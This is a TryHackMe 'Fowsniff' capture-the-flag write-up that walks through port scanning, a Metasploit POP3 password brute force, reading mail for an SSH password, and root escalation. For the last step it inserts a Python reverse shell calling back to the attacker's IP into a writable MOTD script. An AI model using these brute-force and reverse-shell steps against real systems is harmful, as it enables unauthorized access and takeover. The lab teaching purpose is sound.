## Fowsniff CTF - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/ctf)

<i>This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), 
decoding hashes, brute forcing a pop3 login and much more!

This will be structured to go through what you need to do, step by step. Make sure you are connected to our network

Credit to berzerk0 for creating this machine.</i>

**IP: 10.10.207.190**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Brute Force <br>

**Tools Used**: Nmap, Metasploit, Hydra

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap.

  ```
  nmap -Pn -sC -sV -T5 -p- 10.10.207.190

  PORT    STATE SERVICE VERSION
  22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
  |   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
  |_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
  80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Fowsniff Corp - Delivering Solutions
  | http-robots.txt: 1 disallowed entry 
  |_/
  110/tcp open  pop3    Dovecot pop3d
  |_pop3-capabilities: UIDL CAPA USER AUTH-RESP-CODE PIPELINING RESP-CODES TOP SASL(PLAIN)
  143/tcp open  imap    Dovecot imapd
  |_imap-capabilities: more have Pre-login IDLE LOGIN-REFERRALS LITERAL+ post-login OK IMAP4rev1 capabilities listed ENABLE ID SASL-IR AUTH=PLAINA0001
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- Now we google `fowsniff corp` since that's found on web page. Since I'm doing this room almost 6 years after it's creation I found credentials on someone's GitHub page.

  ```
  mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4 -> mailcall
  mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56 -> bilbo101
  tegel@fowsniff:1dc352435fecca338acfd4be10984009 -> apples01
  baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb -> skyler22
  seina@fowsniff:90dc16d47114aa13671c697fd506cf26 -> scoobydoo2
  stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd -> ???
  mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b -> carp4ever
  parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11 -> orlando12
  sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e -> 07011972
  ```
  
- I also cracked those hashes in Crackstation, but you can use whichever tool you like. Now create 2 lists, 1 with usernames and 1 with passwords, and lets do some brute forcing with Metasploit.

  ```
  cat users.txt 
  mauer
  mustikka
  tegel
  baksteen
  seina
  stone
  mursten
  parede
  sciana
  
  cat pass.txt    
  mailcall
  bilbo101
  apples01
  skyler22
  scoobydoo2
  carp4ever
  orlando12
  07011972
  ```

- Start Metasploit, search for pop3 login, use the scanner and will up all neccessary parameters. After that just run it and wait a bit to get valid POP3 credentials.

  ```
  msfconsole

  msf6 > search pop3 login
  
  Matching Modules
  ================
  
     #  Name                               Disclosure Date  Rank    Check  Description
     -  ----                               ---------------  ----    -----  -----------
     0  auxiliary/scanner/pop3/pop3_login  .                normal  No     POP3 Login Utility

  msf6 auxiliary(scanner/pop3/pop3_login) > set RHOSTS 10.10.207.190
  RHOSTS => 10.10.207.190
  msf6 auxiliary(scanner/pop3/pop3_login) > set USER_FILE users.txt
  USER_FILE => users.txt
  msf6 auxiliary(scanner/pop3/pop3_login) > set PASS_FILE pass.txt
  PASS_FILE => pass.txt
  msf6 auxiliary(scanner/pop3/pop3_login) > set VERBOSE false
  VERBOSE => false
  msf6 auxiliary(scanner/pop3/pop3_login) > run
  
  [+] 10.10.207.190:110     - 10.10.207.190:110 - Success: 'seina:scoobydoo2' '+OK Logged in.
  ```

- GOTEM COACH! Now let's login to POP3 with seina credentials, you can use either Telnet or Netcat, I prefer Netcat. There will be 2 messages inside, read them both.

  ```
  nc 10.10.207.190 110
  user seina
  +OK
  pass scoobydoo2
  +OK Logged in.
  
  list
  +OK 2 messages:
  1 1622
  2 1280

  retr 1
  +OK 1622 octets
  Return-Path: <stone@fowsniff>
  X-Original-To: seina@fowsniff
  Delivered-To: seina@fowsniff
  Received: by fowsniff (Postfix, from userid 1000)
          id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
  To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
      mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
      tegel@fowsniff
  Subject: URGENT! Security EVENT!
  Message-Id: <20180313185107.0FA3916A@fowsniff>
  Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
  From: stone@fowsniff (stone)
  
  Dear All,
  
  A few days ago, a malicious actor was able to gain entry to
  our internal email systems. The attacker was able to exploit
  incorrectly filtered escape characters within our SQL database
  to access our login credentials. Both the SQL and authentication
  system used legacy methods that had not been updated in some time.
  
  We have been instructed to perform a complete internal system
  overhaul. While the main systems are "in the shop," we have
  moved to this isolated, temporary server that has minimal
  functionality.
  
  This server is capable of sending and receiving emails, but only
  locally. That means you can only send emails to other users, not
  to the world wide web. You can, however, access this system via 
  the SSH protocol.
  
  The temporary password for SSH is "S1ck3nBluff+secureshell"
  
  You MUST change this password as soon as possible, and you will do so under my
  guidance. I saw the leak the attacker posted online, and I must say that your
  passwords were not very secure.
  
  Come see me in my office at your earliest convenience and we'll set it up.
  
  Thanks,
  A.J Stone

  retr 2
  +OK 1280 octets
  Return-Path: <baksteen@fowsniff>
  X-Original-To: seina@fowsniff
  Delivered-To: seina@fowsniff
  Received: by fowsniff (Postfix, from userid 1004)
          id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
  To: seina@fowsniff
  Subject: You missed out!
  Message-Id: <20180313185405.101CA1AC2@fowsniff>
  Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
  From: baksteen@fowsniff
  
  Devin,
  
  You should have seen the brass lay into AJ today!
  We are going to be talking about this one for a looooong time hahaha.
  Who knew the regional manager had been in the navy? She was swearing like a sailor!
  
  I don't know what kind of pneumonia or something you brought back with
  you from your camping trip, but I think I'm coming down with it myself.
  How long have you been gone - a week?
  Next time you're going to get sick and miss the managerial blowout of the century,
  at least keep it to yourself!
  
  I'm going to head home early and eat some chicken soup. 
  I think I just got an email from Stone, too, but it's probably just some
  "Let me explain the tone of my meeting with management" face-saving mail.
  I'll read it when I get back.
  
  Feel better,
  
  Skyler
  
  PS: Make sure you change your email password. 
  AJ had been telling us to do that right before Captain Profanity showed up.
  ```

- `list` command is lists all messages and `retr` reads them. From first one we got a password `S1ck3nBluff+secureshell` and from second one username `baksteen`.

---

## 🧍 User Privilege Escalation

- Now login with found credentials using SSH. At this time, challenge is already done. You can use `find / -type f -group users 2>/dev/null` in order to check files for group `users`.

  ```
  baksteen@fowsniff:~$ find / -type f -group users 2>/dev/null
  /opt/cube/cube.sh
  /home/baksteen/.cache/motd.legal-displayed
  /home/baksteen/Maildir/dovecot-uidvalidity
  /home/baksteen/Maildir/dovecot.index.log
  /home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
  /home/baksteen/Maildir/dovecot-uidlist
  /home/baksteen/Maildir/dovecot-uidvalidity.5aa21fac
  /home/baksteen/.viminfo
  /home/baksteen/.bash_history
  /home/baksteen/.lesshsQ
  /home/baksteen/.bash_logout
  /home/baksteen/term.txt
  /home/baksteen/.profile
  [SNIP!]
  ```
  
- `/opt/cube/cube.sh` this is the file that is used for privilege escalation.

---

## 👑 Root Privilege Escalation

- There is not much to say in regards to this, challenge already explained everything through walkthrough. You just edit the `cube.sh` file by adding the Python reverse shell.

  ```
  baksteen@fowsniff:~$ nano /opt/cube/cube.sh
  printf "
                              _____                       _  __  __  
        :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
     :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
  .sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
  -:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
  -:      y.      dssssssso                ____                      
  -:      y.      dssssssso               / ___|___  _ __ _ __        
  -:      y.      dssssssso              | |   / _ \| '__| '_ \     
  -:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
  -:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
  -:    .+mdddddddmyyyyyhy:                              |_|        
  -: -odMMMMMMMMMMmhhdy/.

  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<YOUR-THM-IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'   
  ```
  
- Save the file and exit SSH. Start a listener on your Kali `nc -lvnp 1234` and login again with SSH. You should have root shell on your listener.

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `/`

- What did I learn?
  `It's a walkthrough room, and I already did some Vulnhub labs in the past...`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
